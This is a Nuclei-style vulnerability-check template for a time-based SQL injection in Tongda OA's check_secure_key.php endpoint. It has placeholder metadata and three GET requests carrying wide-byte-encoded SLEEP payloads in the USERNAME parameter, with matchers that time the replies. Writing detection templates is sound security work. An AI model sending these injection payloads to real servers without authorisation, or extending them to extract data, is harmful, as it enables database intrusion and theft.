id: tongda-oa-checksecurekey-sqli

info:
  name: Template Name
  author: wangzong
  severity: high
  description: 通达OA check_secure_key存在前台SQL注入漏洞,攻击者通过漏洞可以获取数据库信息。
  reference:
    - https://
  tags: tags

http:
  - method: GET
    path:
      - "{{BaseURL}}//ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%283%29%29%29vMBT%29--+NpkQ"
      - "{{BaseURL}}//ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%286%29%29%29vMBT%29--+NpkQ"
      - "{{BaseURL}}//ispirit/check_secure_key.php?USERNAME=%df'+AND+%28SELECT+6211+FROM+%28SELECT%28SLEEP%289%29%29%29vMBT%29--+NpkQ"

    matchers:
      - type: dsl
        condition: and
        dsl:
          - "duration_1>=3  && duration_1<=6"
          - "duration_2>=6  && duration_2<=9"
          - "duration_3>=9  && duration_3<=12"